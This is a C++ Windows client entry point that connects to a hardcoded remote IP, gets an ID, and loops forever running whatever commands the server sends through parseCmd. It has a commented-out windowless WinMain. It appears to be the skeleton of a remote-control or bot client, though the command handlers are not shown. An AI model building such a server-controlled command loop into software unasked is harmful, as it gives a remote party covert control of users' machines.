#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS


#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>

#include <stdexcept>
#include <stdio.h>	
#include <iostream>
#include <string>

#include "Client.h"
#include "Online.h"
#include "uniID.h"
#include "Commands.h"


using namespace std;

//int WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
int main()
{
	WSADATA wsa;
	SOCKET server;
	SOCKADDR_IN serverAddress;

	srand(time(0) % 0x7ABCFF);

	//Connect to remote server

	try
	{
		connectToServer("79.133.182.102", 26780, &wsa, &server, &serverAddress);
		int userID;
		getID(server, &userID);
		puts(("Client ID: " + to_string(userID)).c_str());

		while (true)
		{
			char receiveBuffer[2048];
			receiveMessage(server, receiveBuffer, sizeof receiveBuffer);
			string data = string(receiveBuffer);
			puts(("DATA FROM SERVER: " + data).c_str());
			parseCmd(server, userID, data);
		}
	}
	catch (std::runtime_error& err)
	{
		std::cerr << "ERROR OCCURED: " << err.what() << std::endl;
		closesocket(server);
		WSACleanup();
		return -1;
	}
	catch (const std::exception&)
	{
		closesocket(server);
		WSACleanup();
		return -1;
	}

	closesocket(server);
	WSACleanup();
	return 0;
}